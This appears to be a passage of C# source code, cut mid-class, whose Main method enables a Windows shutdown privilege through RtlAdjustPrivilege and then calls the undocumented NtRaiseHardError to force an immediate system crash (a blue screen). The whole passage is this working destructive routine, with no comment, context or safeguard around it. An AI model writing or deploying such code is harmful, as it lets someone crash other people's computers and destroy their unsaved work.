        [DllImport("ntdll.dll")]
        public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
        [DllImport("ntdll.dll")]
        public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

        static unsafe void Main(string[] args)
        {
            Boolean tmp1;
            uint tmp2;
            RtlAdjustPrivilege(19, true, false, out tmp1);
            NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out tmp2);
        }
    }
